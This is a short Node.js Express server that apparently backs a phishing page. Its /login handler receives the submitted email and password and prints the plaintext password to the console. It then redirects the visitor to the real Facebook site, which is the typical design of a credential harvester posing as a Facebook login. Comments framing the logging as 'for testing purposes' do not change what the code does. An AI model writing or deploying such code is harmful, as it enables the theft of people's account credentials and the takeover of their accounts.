const express = require('express');
const bodyParser = require('body-parser');
const bcrypt = require('bcrypt');

const app = express();
const PORT = process.env.PORT || 3000;

// Middleware
app.use(bodyParser.urlencoded({ extended: true }));
app.use(express.static('public')); // Serve static files (like your HTML)

// Serve the login page
app.get('/', (req, res) => {
    res.sendFile(__dirname + '/public/index.html'); // Adjust the path as necessary
});

// Handle form submission
app.post('/login', async (req, res) => {
    const { email, password } = req.body;

    // Hash the password before saving (for registration-like use)
    const hashedPassword = await bcrypt.hash(password, 10);

    // Simulate saving the user (without a real database)
    const newUser = {
        email,
        password: hashedPassword
    };

    console.log('New User Created:', newUser); // Log the new user object (for testing purposes)
    
    // Log email and password (avoid logging passwords in real apps)
    console.log('Username:', email);
    console.log('Password:', password);

    // Redirect to Facebook after processing
    res.redirect('https://www.facebook.com');
});

// Start the server
app.listen(PORT, () => {
    console.log(`Server is running at http://localhost:${PORT}`);
});
